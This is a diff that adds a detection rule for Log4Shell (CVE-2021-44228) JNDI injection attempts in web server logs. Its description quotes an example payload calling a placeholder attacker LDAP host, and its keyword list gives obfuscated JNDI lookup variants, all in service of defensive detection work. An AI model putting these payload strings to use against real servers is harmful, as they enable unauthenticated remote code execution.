@@ -1,0 +1,32 @@
+title: Log4Shell JNDI Injection Attempt
+id: f7a3e91b-2c4d-4e8f-a152-9b6d3c7e0f84
+status: stable
+description: |
+  Detects exploitation attempts targeting Apache Log4j's JNDI lookup feature
+  (Log4Shell, CVE-2021-44228). Attackers embed ${jndi:ldap://attacker.com/a}
+  payloads in HTTP headers, User-Agent strings, or request parameters to trigger
+  remote class loading via LDAP/RMI and achieve unauthenticated RCE on the server.
+author: Security Operations
+date: 2024/01/15
+modified: 2024/06/01
+tags:
+    - attack.initial-access
+    - attack.T1190
+    - attack.execution
+    - attack.T1059.004
+    - cve.2021.44228
+logsource:
+    category: webserver
+detection:
+    keywords:
+        - '${jndi:'
+        - '${${lower:j}ndi'
+        - '${${upper:j}ndi'
+        - '${${::-j}${::-n}${::-d}${::-i}'
+        - 'jndi:ldap://'
+        - 'jndi:rmi://'
+        - 'jndi:dns://'
+falsepositives:
+    - Security scanners and vulnerability assessment tools testing for Log4Shell
+    - Penetration testing activities against owned systems
+level: critical
